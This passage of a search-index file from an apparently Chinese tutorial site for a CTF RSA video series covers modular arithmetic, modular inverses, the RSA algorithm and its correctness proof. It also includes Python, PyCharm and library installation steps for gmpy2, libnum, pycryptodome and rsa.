<pre><code>\u8fd0\u7b97\u89c4\u5219\n\n\u6a21\u8fd0\u7b97\u4e0e\u57fa\u672c\u56db\u5219\u8fd0\u7b97\u6709\u4e9b\u76f8\u4f3c\uff0c\u4f46\u662f\u9664\u6cd5\u9664\u5916\u3002\u5176\u89c4\u5219\u5982\u4e0b\uff1a\n(a + b) % p = (a % p + b % p) % p\n(a - b) % p = (a % p - b % p) % p\n(a * b) % p = (a % p * b % p) % p\na ^ b % p = ((a % p) ^ b) % p\n\u7ed3\u5408\u5f8b\n((a + b) % p + c) = (a + (b + c) % p) % p\n((a * b) % p * c) = (a * (b * c) % p) % p\n\u4ea4\u6362\u5f8b\n(a + b) % p = (b + a) % p\n(a * b) % p = (b * a) % p\n\u5206\u914d\u5f8b\n(a + b) % p = (a % p + b % p) % p\n((a + b) % p * c) % p = ((a * c) % p + (b * c) % p\n\u91cd\u8981\u5b9a\u7406\n\u82e5 a \u2261 b (mod p)\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u7684 c\uff0c\u90fd\u6709(a + c) \u2261 (b + c) (mod p)\n\u82e5 a \u2261 b (mod p)\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u7684 c\uff0c\u90fd\u6709(a * c) \u2261 (b * c) (mod p)\n\u82e5 a \u2261 b (mod p)\uff0cc \u2261 d (mod p)\uff0c\u5219\n(a + c) \u2261 (b + d) (mod p)\n(a - c) \u2261 (b - d) (mod p)\n(a * c) \u2261 (b * d) (mod p)\n(a / c) \u2261 (b / d) (mod p)\n\n\u9006\u5143\n\n\u9006\u5143\u662f\u6307\u5728\u6570\u5b66\u9886\u57df\u7fa4G\u4e2d\u4efb\u610f\u4e00\u4e2a\u5143 a\uff0c\u90fd\u5728G\u4e2d\u6709\u552f\u4e00\u7684\u9006\u5143a'\uff0c\u5177\u6709\u6027\u8d28 a \u00b7 a' = a' \u00b7 a = e ( \u00b7 \u4e3a\u8be5\u7fa4\u4e2d\u5b9a\u4e49\u7684\u8fd0\u7b97)\u3002\u5176\u4e2d\uff0ce\u4e3a\u8be5\u7fa4\u7684\u5355\u4f4d\u5143\u3002\n\u9006\u5143\u5176\u5b9e\u662f\u52a0\u6cd5\u4e2d\u7684\u76f8\u53cd\u6570\u4ee5\u53ca\u4e58\u6cd5\u4e2d\u7684\u5012\u6570\u7684\u62d3\u5c55\u601d\u60f3\u3002\n\u5728\u6a21\u8fd0\u7b97\u4e2d\uff0c\u5355\u4f4d\u5143\u4fbf\u662f1\u3002\na mod p\u7684\u9006\u5143\u4fbf\u662f\u53ef\u4ee5\u4f7f a * a' mod p = 1 \u7684\u6700\u5c0fa'\u3002\n\n\u679a\u4e3e\u6cd5\n\u679a\u4e3e1\u5230p - 1\u7684\u6574\u6570bi\uff0c\u82e5b * bi % p = 1\uff0c\u5219bi\u5373\u4e3ab mod p\u7684\u4e58\u6cd5\u9006\u5143\u3002\n\u4e3a\u4ec0\u4e48\u53ea\u679a\u4e3e\u5230p - 1\u5462\uff1f\n\n1. \u5982\u679c\u679a\u4e3e\u5230 p\uff0c\u90a3\u4e48\u663e\u7136 b * p % p = 0;\uff1b\n2. \u5982\u679c\u679a\u4e3e\u5230 p + k ( 0 &lt; k &lt; p)\uff0c\u90a3\u4e48\u6709 b * (p + k) % p = b * p % p + b * k % p = b * k % p\uff0c\u8fd9\u6837\u5c31\u8fd4\u56de\u4e86\u679a\u4e3e1\u5230p - 1\u7684\u60c5\u51b5\uff1b\n3. \u5982\u679c\u679a\u4e3e\u5230 p + k ( k &gt; p)\uff0c\u540c\u7b2c\u4e8c\u79cd\u60c5\u51b5\n\n\u62d3\u5c55\u6b27\u51e0\u91cc\u5f97(Extend - Eculid)\n\u6c42\u6700\u5c0f\u6574\u6570x\u3001y\uff0c\u4f7f x * a + y * b = gcd(a , b)\uff1b\n\n\u7c7b\u4f3c\u8fd9\u6837\u7684\u95ee\u9898\u4fbf\u53ef\u4ee5\u4f7f\u7528\u62d3\u5c55\u6b27\u51e0\u91cc\u5f97\u6765\u6c42\u89e3\u3002\n\n\u7531\u6b27\u51e0\u91cc\u5f97\u5b9a\u7406\u53ef\u77e5gcd(a , b) = gcd(b , a % b) (\u5047\u8bbe a &gt; b)\uff0c\n\n\u6240\u4ee5\u6709x' * b + y' * (a % b) = gcd(a , b)\uff0c\u5047\u8bbe\u5df2\u7ecf\u6c42\u5f97 x' \u548c y'\uff0c\u90a3\u4e48\u6709 \uff1a\n\n\u2235 x' * b + y' * ( a % b) = gcd(a , b) and a % b = a - [a / b] * b\n\n\u2234 x' * b + y' * ( a - [a / b] * b) = gcd(a , b)\n\n\u2234 y' * a + (x' - y' * [a / b]) * b = gcd(a , b)\n\n\u5982\u6b64\u8fd9\u4e2a\u95ee\u9898\u4fbf\u53ef\u4ee5\u9012\u5f52\u7684\u6c42\u89e3\u4e86\u3002\n\n\uff08\u663e\u7136\u5982\u679cb = 0\u7684\u8bdd\uff0c\u90a3\u4e48x = 1\uff0cy = 0\uff09\n\n\u90a3\u4e48\u6c42\u89e3 b' \u4f7f\u5f97 b * b\u2018 mod p = 1 \u8fd9\u4e2a\u95ee\u9898\u4fbf\u53ef\u4ee5\u8f6c\u5316\u4e3a\uff1a\n\n\u6c42\u6700\u5c0f\u6574\u6570 b'\u3001k\uff0c\u4f7f\u5f97 b' * b + k * p = 1\uff1b\n\n\u8d39\u9a6c\u5c0f\u5b9a\u7406(Fermat's little theorem)\n\u5047\u5982 p \u662f\u8d28\u6570\uff0c\u90a3\u4e48 a ^ (p-1) \u2261 1 (mod p) \u3002\n\u63a8\u8bba\uff1a b ^ (p - 2) % p \u5373\u4e3a b mod p \u7684\u4e58\u6cd5\u9006\u5143\u3002\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/","title":"\u3010CTF\u89c6\u9891\u5408\u8f91\u3011python3\u7684RSA\u811a\u672c\u7cfb\u5217","text":"<p> \u7ea6 354 \u4e2a\u5b57  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u968f\u7740python2 \u505c\u6b62\u66f4\u65b0\u540e\u3002\u9010\u6b65\u5f00\u59cb\u8f6c\u5230python3\u3002 \u5f88\u591arsa\u7684\u811a\u672c\u90fd\u662f\u57fa\u4e8epython2\uff0c\u6211\u73b0\u5728\u5f00\u59cb\u7740\u624b\u5c06\u539f\u6709python2\u811a\u672c\u5347\u7ea7\u4e3apython3\u3002 \u501f\u6b64\u5c06\u811a\u672c\u5206\u4eab\u51fa\u6765\u3002</p> <p>\u672c\u89c6\u9891\u4ece\u57fa\u7840\u5165\u95e8\uff0c\u540c\u65f6\u542b\u51fa\u9898\u548c\u89e3\u9898\u811a\u672c\u3002</p> <p>\u89c6\u9891\u4e2d\u7684\u76f8\u5173\u811a\u672c\uff0c\u7a0d\u540e\u4f1a\u653e\u5230B\u7ad9\u4e13\u680f\u91cc\u3002</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#p01pythonpycharm","title":"P01.python\u5b89\u88c5\u53capycharm\u914d\u7f6e","text":"<p>\u8fd9\u662f\u57fa\u7840\u90e8\u5206\uff0c\u4f1a\u5f97\u53ef\u4ee5\u7565\u8fc7</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#python3","title":"python3 \u5b98\u7f51\u4e0b\u8f7d\u5730\u5740","text":"<ul> <li> https://www.python.org/</li> <li> https://www.python.org/downloads/</li> <li> https://www.python.org/downloads/windows/</li> </ul>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#python-pycharm-community","title":"python\u7f16\u8bd1\u5668 pycharm Community\u4e0b\u8f7d\u5730\u5740","text":"<p>\u793e\u533a\u7248\u5df2\u7ecf\u8db3\u591f\u4e86\uff0c\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528\u4e13\u4e1a\u7248\uff0c\u4e13\u4e1a\u7248\u52a0\u8f7d\u6162\uff0c\u5f71\u54cd\u6027\u80fd</p> <ul> <li> https://www.jetbrains.com/zh-cn/pycharm/download/#section=windows</li> </ul>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#pycharm","title":"pycharm \u6c49\u5316\u63d2\u4ef6","text":"<p>\u00a0\u00a0\u00a0\u6253\u5f00pycharm\u5de6\u4e0a\u89d2\u7684file(\u6587\u4ef6) &gt; \u9009\u62e9settings(\u8bbe\u7f6e) &gt;\u6253\u5f00plugins(\u63d2\u4ef6) &gt; \u641c\u7d22chinese(\u4e2d\u6587\u63d2\u4ef6),\u4e0b\u8f7d\u597d\u540e\u91cd\u542fpycharm</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#pycharm_1","title":"pycharm \u8bbe\u7f6e\u865a\u62df\u73af\u5883","text":"<p>\u8bbe\u7f6e\u865a\u62df\u73af\u5883\u7684\u597d\u5904\u662f\uff1a - 1.\u65b9\u4fbf\u79fb\u690d\u548c\u91cd\u88c5\u7cfb\u7edf\u4ee5\u540e\uff0c\u5b89\u88c5\u6a21\u5757 - 2.\u907f\u514d\u5b89\u88c5\u8f83\u591a\u6a21\u5757\uff0c\u53d1\u751f\u51b2\u7a81 </p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#pycharm_2","title":"pycharm \u5b89\u88c5\u5e93\u53ca\u8bbe\u7f6e\u56fd\u5185\u955c\u50cf","text":"<ul> <li> \u6e05\u534e\uff1ahttps://pypi.tuna.tsinghua.edu.cn/simple</li> <li> \u963f\u91cc\u4e91\uff1ahttp://mirrors.aliyun.com/pypi/simple/</li> <li> \u4e2d\u56fd\u79d1\u6280\u5927\u5b66 https://pypi.mirrors.ustc.edu.cn/simple/</li> <li> \u534e\u4e2d\u7406\u5de5\u5927\u5b66\uff1ahttp://pypi.hustunique.com/</li> <li> \u5c71\u4e1c\u7406\u5de5\u5927\u5b66\uff1ahttp://pypi.sdutlinux.org/ </li> <li> \u8c46\u74e3\uff1ahttp://pypi.douban.com/simple/ </li> </ul>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#libnum","title":"\u5b89\u88c5 libnum\u5e93","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#pycryptodome","title":"\u5b89\u88c5 pycryptodome\u5e93","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#rsa","title":"\u5b89\u88c5 rsa\u5e93","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#pycharm_3","title":"pycharm \u5b9e\u7528\u63d2\u4ef6","text":"<ul> <li>Translation \u7ffb\u8bd1</li> <li>Material Theme UI \u4e3b\u9898\u8bbe\u7f6e</li> <li>Rainbow Brackets \u4ee3\u7801\u5757\u4e4b\u95f4\u5f88\u6e05\u6670\u7684\u663e\u793a\u51fa\u5404\u79cd\u989c\u8272</li> </ul>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P01.python%E5%AE%89%E8%A3%85%E5%8F%8Apycharm%E9%85%8D%E7%BD%AE/#_1","title":"\u8bbe\u7f6e\u5b57\u4f53\u653e\u5927\u6216\u7f29\u5c0f","text":"<p>\u6587\u7ae0\u6765\u6e90\uff1a <pre><code>https://blog.csdn.net/ailc28397/article/details/102278026\n</code></pre></p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/","title":"P02.gmpy2\u53ca\u76f8\u5173\u5e93\u5b89\u88c5","text":"<p> \u7ea6 217 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#p02gmpy2","title":"P02.gmpy2\u53ca\u76f8\u5173\u5e93\u5b89\u88c5","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#pip","title":"pip \u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c","text":"<pre><code>pip install --upgrade pip -i https://pypi.mirrors.ustc.edu.cn/simple/\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#pythonwindows","title":"Python\u6269\u5c55\u7a0b\u5e8f\u5305\u7684\u975e\u5b98\u65b9Windows\u4e8c\u8fdb\u5236\u6587\u4ef6 \u4e0b\u8f7d","text":"<p><pre><code>https://www.lfd.uci.edu/~gohlke/pythonlibs/\n</code></pre> \u5728\u8be5\u7f51\u9875\u4e2d\u627e\u5230gmpy2,\u6ce8\u610f\u627e\u5bf9\u5e94\u5f97\u7248\u672c</p> <ul> <li> gmpy2\u20112.0.8\u2011cp39\u2011cp39\u2011win_amd64.whl</li> <li> gmpy2\u20112.0.8\u2011cp39\u2011cp39\u2011win32.whl</li> <li> gmpy2\u20112.0.8\u2011cp38\u2011cp38\u2011win_amd64.whl</li> <li> gmpy2\u20112.0.8\u2011cp38\u2011cp38\u2011win32.whl</li> <li> gmpy2\u20112.0.8\u2011cp37\u2011cp37m\u2011win_amd64.whl</li> <li> gmpy2\u20112.0.8\u2011cp37\u2011cp37m\u2011win32.whl</li> <li> gmpy2\u20112.0.8\u2011cp36\u2011cp36m\u2011win_amd64.whl</li> <li> gmpy2\u20112.0.8\u2011cp36\u2011cp36m\u2011win32.whl</li> <li> gmpy2\u20112.0.8\u2011cp35\u2011cp35m\u2011win_amd64.whl</li> <li> gmpy2\u20112.0.8\u2011cp35\u2011cp35m\u2011win32.whl</li> <li> gmpy2\u20112.0.8\u2011cp34\u2011cp34m\u2011win_amd64.whl</li> <li> gmpy2\u20112.0.8\u2011cp34\u2011cp34m\u2011win32.whl</li> <li> gmpy2\u20112.0.8\u2011cp27\u2011cp27m\u2011win_amd64.whl</li> <li> gmpy2\u20112.0.8\u2011cp27\u2011cp27m\u2011win32.whl</li> </ul>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#pip-whl","title":"pip \u5b89\u88c5 whl\u6587\u4ef6\uff0c\u4e00\u5b9a\u6ce8\u610f\u7248\u672c","text":"<pre><code>pip install gmpy2\u20112.0.8\u2011cp39\u2011cp39\u2011win_amd64.whl\n</code></pre> <pre><code>#\u7248\u672c\u4e0d\u7b26\u7684\u9519\u8bef\uff1a\nERROR: gmpy2-2.0.8-cp36-cp36m-win_amd64.whl is not a supported wheel on this platform.\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#libnum","title":"\u5b89\u88c5 libnum \u5e93","text":"<pre><code>pip install libnum -i https://pypi.mirrors.ustc.edu.cn/simple/\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#pycryptodome","title":"\u5b89\u88c5 pycryptodome\u5e93","text":"<pre><code>pip install pycryptodome -i https://pypi.mirrors.ustc.edu.cn/simple/\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#rsa","title":"\u5b89\u88c5 rsa\u5e93","text":"<pre><code>pip install rsa -i https://pypi.mirrors.ustc.edu.cn/simple/\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#pip_1","title":"pip \u67e5\u770b\u5df2\u5b89\u88c5\u5e93","text":"<pre><code>pip list\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P02.gmpy2%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%BA%93%E5%AE%89%E8%A3%85/#pip_2","title":"pip \u66f4\u65b0\u5e93","text":"<pre><code>pip install  --upgrade rsa  -i https://pypi.mirrors.ustc.edu.cn/simple/\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/","title":"P03.RSA\u7b97\u6cd5\u7b80\u4ecb\u53ca\u539f\u7406","text":"<p> \u7ea6 434 \u4e2a\u5b57  69 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#p03rsa","title":"P03.RSA\u7b80\u4ecb\u53ca\u539f\u7406","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#rsa","title":"rsa\u7b97\u6cd5\u7b80\u4ecb","text":"<p>RSA\u516c\u5f00 \u5bc6\u94a5 \u5bc6\u7801\u4f53\u5236\u3002\u6240\u8c13\u7684\u516c\u5f00\u5bc6\u94a5\u5bc6\u7801\u4f53\u5236\u5c31\u662f\u4f7f\u7528\u4e0d\u540c\u7684\u52a0\u5bc6\u5bc6\u94a5\u4e0e\u89e3\u5bc6\u5bc6\u94a5\uff0c\u662f\u4e00\u79cd\u201c\u7531\u5df2\u77e5\u52a0\u5bc6\u5bc6\u94a5\u63a8\u5bfc\u51fa\u89e3\u5bc6\u5bc6\u94a5\u5728\u8ba1\u7b97\u4e0a\u662f\u4e0d\u53ef\u884c\u7684\u201d\u5bc6\u7801\u4f53\u5236\u3002</p> <pre><code>\u9009\u62e9\u4e24\u4e2a\u5927\u7d20\u6570p\u548cq\uff0c\u8ba1\u7b97\u51fa\u6a21\u6570N = p * q\n\n\u8ba1\u7b97\u03c6(N) = (p\u22121) * (q\u22121) \u5373N\u7684\u6b27\u62c9\u51fd\u6570\uff0c\u7136\u540e\u9009\u62e9\u4e00\u4e2ae (1&lt;e&lt;\u03c6(N))\uff0c\u4e14e\u548c\u03c6N\u4e92\u7d20\n\n\u53d6e\u7684\u6a21\u53cd\u6570\u4e3ad(\u9006\u5143)\uff0c\u8ba1\u7b97\u65b9\u6cd5: e * d \u2261 1 (mod \u03c6(N))\n\n\u5bf9\u660e\u6587m\u8fdb\u884c\u52a0\u5bc6\uff1ac=m^e%N\nc = pow(m, e, N)\uff0c\u5f97\u5230\u7684c\u5373\u4e3a\u5bc6\u6587\n\n\u5bf9\u5bc6\u6587c\u8fdb\u884c\u89e3\u5bc6:m=c^d%N\nm = pow(c, d, N)\uff0c\u5f97\u5230\u7684m\u5373\u4e3a\u660e\u6587\n</code></pre> <pre><code>p \u548c q \uff1a\u5927\u6574\u6570N\u7684\u4e24\u4e2a\u56e0\u5b50\uff08factor\uff09\n\nN\uff1a\u5927\u6574\u6570N\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a\u6a21\u6570\uff08modulus\uff09\n\ne \u548c d\uff1a\u4e92\u4e3a\u6a21\u53cd\u6570\u7684\u4e24\u4e2a\u6307\u6570\uff08exponent\uff09\n\nc \u548c m\uff1a\u5206\u522b\u662f\u5bc6\u6587\u548c\u660e\u6587\uff0c\u8fd9\u91cc\u4e00\u822c\u6307\u7684\u662f\u4e00\u4e2a\u5341\u8fdb\u5236\u7684\u6570\n</code></pre> <pre><code>\uff08N\uff0ce\uff09\uff1a\u516c\u94a5\n\n\uff08N\uff0cd\uff09\uff1a\u79c1\u94a5\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#rsa_1","title":"rsa\u7b97\u6cd5\u539f\u7406","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#n","title":"\u6b27\u62c9\u51fd\u6570\u03c6(n)","text":"<p>\u6b27\u62c9\u51fd\u6570\u03c6(n)\u7684\u5b9a\u4e49\u662f\u5c0f\u4e8en\u7684\u81ea\u7136\u6570\u4e2d\u4e0en\u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#_1","title":"\u6b27\u62c9\u5b9a\u7406","text":"<p>\u82e5n,a\u4e3a\u6b63\u6574\u6570\uff0c\u4e14n,a\u4e92\u8d28\uff0c\u5219:a^\u03c6(n)\u22611 mod n</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#_2","title":"\u8d39\u9a6c\u5c0f\u5b9a\u7406","text":"<p>\u8d39\u9a6c\u5c0f\u5b9a\u7406: :</p> <pre><code>\u82e5p \u662f\u8d28\u6570,a \u4e0ep \u4e92\u8d28\uff0c\n\na^p \u2261a (mod p)\n\na^{p-1}\u22611 (mod p)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#_3","title":"\u6a21\u8fd0\u7b97","text":"<p>\u8fd0\u7b97\u89c4\u5219</p> <p>\u6a21\u8fd0\u7b97\u4e0e\u57fa\u672c\u56db\u5219\u8fd0\u7b97\u6709\u4e9b\u76f8\u4f3c\uff0c\u4f46\u662f\u9664\u6cd5\u9664\u5916\u3002\u5176\u89c4\u5219\u5982\u4e0b\uff1a</p> <pre><code>(a + b) % p = (a % p + b % p) % p\n(a - b) % p = (a % p - b % p) % p\n(a * b) % p = (a % p * b % p) % p\na ^ b % p = ((a % p) ^ b) % p\n\u7ed3\u5408\u5f8b\n((a + b) % p + c)%p = (a + (b + c) % p) % p\n((a * b) % p * c) %p= (a * (b * c) % p) % p\n\u4ea4\u6362\u5f8b\n(a + b) % p = (b + a) % p\n(a * b) % p = (b * a) % p\n\u5206\u914d\u5f8b\n(a + b) % p = (a % p + b % p) % p\n((a + b) % p * c) % p = ((a * c) % p + (b * c) % p\n\u91cd\u8981\u5b9a\u7406\n\u82e5 a \u2261 b (mod p)\uff0c\u5219\u5bf9\u4e8e\u6b63\u6574\u6570 c\uff0c\u90fd\u6709(a**c) \u2261 (b**c) (mod p)\n\u82e5 a \u2261 b (mod p)\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u7684 c\uff0c\u90fd\u6709(a + c) \u2261 (b + c) (mod p)\n\u82e5 a \u2261 b (mod p)\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u7684 c\uff0c\u90fd\u6709(a * c) \u2261 (b * c) (mod p)\n\n\u5982\u679cac\u2261bc (mod m)\uff0c\u4e14c\u548cm\u4e92\u8d28\uff0c\u5219a\u2261b (mod m\uff09\u3002\n[\u7406\u89e3\uff1a\u5f53\u4e14\u4ec5\u5f53c\u548cm\u4e92\u8d28,c^-1\u5b58\u5728,\u7b49\u5f0f\u5de6\u53f3\u53ef\u540c\u4e58\u6a21\u9006\u3002]\n\u5982\u679ca\u2261b (mod m),a\u2261b (mod n)\uff0c\u4e14n\u548cm\u4e92\u8d28\uff0c\u5219a\u2261b (mod mn\uff09\n\n\n\u82e5 a \u2261 b (mod p)\uff0cc \u2261 d (mod p)\uff0c\u5219\n(a + c) \u2261 (b + d) (mod p)\n(a - c) \u2261 (b - d) (mod p)\n(a * c) \u2261 (b * d) (mod p)\n(a / c) \u2261 (b / d) (mod p)\n\n\u9664\u6cd5\u89c4\u5219\uff1a\n\u5728\u6a21n\u610f\u4e49\u4e0b\uff0ca/b\u4e0d\u518d\u4ec5\u4ec5\u4ee3\u8868\u8fd9\u4e24\u4e2a\u6570\u76f8\u9664\uff0c\u2f7d\u662f\u6307 a+k1*n \u548c b+k2*n\u8fd9\u4e24\u4e2a\u7ec4\u6570\u4e2d\u4efb\u610f\u4e24\u4e2a\u76f8\u9664\uff0c\u4f7f\u5546\u4e3a\u6574\u6570\n\u56e0\u6b64\u4e5f\u5c31\u53ef\u4ee5\u7406\u89e3\uff0c\u9664\u4ee5\u2f00\u4e2a\u6570\u7b49\u4ef7\u4e8e\u4e58\u4ee5\u5b83\u7684\u9006\na/b \u2261 c(mod n) &lt;=&gt; a \u2261 c*(b^-1) (mod n)\uff0c\u5176\u4e2db\u6a21n\u7684\u9006\u8bb0\u4f5cb\u7684\u8d1f\u2f00\u6b21\u2f45\u3002\n</code></pre> <pre><code>\u9006\u5143\na mod p\u7684\u9006\u5143\u4fbf\u662f\u53ef\u4ee5\u4f7f a * a' mod p = 1 \u7684\u6700\u5c0fa'\u3002\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P03.RSA%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86/#_4","title":"\u63a8\u5bfc\u8fc7\u7a0b","text":"<p><pre><code>\u5f0f1\uff1ac=m^e%N\n\u5f0f2\uff1am=c^d%N\n</code></pre> \u5c06\u5f0f1\u5e26\u5165\u5f0f2 \u5f97 m = (m ^ e % N ) ^ d % N</p> <p>\u9700\u8981\u8bc1\u660e\uff1am == ( m ^ e % N ) ^ d % N</p> <p><pre><code>(m^e%N)^d%N\n\n=&gt;  (m^e)^d%N #\u6a21\u8fd0\u7b97 a ^ b % p = ((a % p) ^ b) % p\n\nm^(e*d)%N #\u5e42\u7684\u4e58\u65b9\uff0c\u5e95\u6570\u4e0d\u53d8\uff0c\u6307\u6570\u76f8\u4e58\n</code></pre> \u5c06 e * d \u2261 1 (mod \u03c6(N)) \u5373 e * d =  K * \u03c6(N) + 1\uff0cK\u4e3a\u4efb\u610f\u6b63\u6574\u6570\uff0c\u4ee3\u5165\u5f97\uff1a</p> <pre><code>=&gt; (m^(K*\u03c6(N)+1))%N   \n\n=&gt; (m^(K*\u03c6(N)*m^1)%N # \u540c\u5e95\u6570\u76f8\u4e58\uff0c\u6307\u6570\u76f8\u52a0\n\n=&gt; (m^(K*\u03c6(N)*m)%N \n\n=&gt; ((m^\u03c6(N)^K%N*m)%N # \u5e42\u7684\u4e58\u65b9\uff0c\u5e95\u6570\u4e0d\u53d8\uff0c\u6307\u6570\u76f8\u4e58\n\n=&gt; ((m^\u03c6(N)^K%N*m%N)%N # (a * b) % p = (a % p * b % p) % p\n\n=&gt; ((m^\u03c6(N)%N)^K%N*m%N)%N # a ^ b % p = ((a % p) ^ b) % p\n\n=&gt; (1^K%N*m%N)%N # \u6839\u636e\u6b27\u62c9\u5b9a\u7406\uff1aa^\u03c6(n)\u22611 mod n \u5373 a^\u03c6(n) mod n = 1\n\n=&gt; (m%N)%N # 1^K%N=1\n\n=&gt; (m%N)%N \n\n=&gt; (m%N)^1%N \n\n=&gt; (m^1)%N   # a ^ b % p = ((a % p) ^ b) % p \n\n=&gt; m%N \n\nm  #\u56e0\u4e3a m &lt; N\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P04.RSA%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%84%9A%E6%9C%AC/","title":"P04.RSA\u57fa\u7840\u9898\u76ee\u53ca\u811a\u672c","text":"<p> \u7ea6 33 \u4e2a\u5b57  68 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 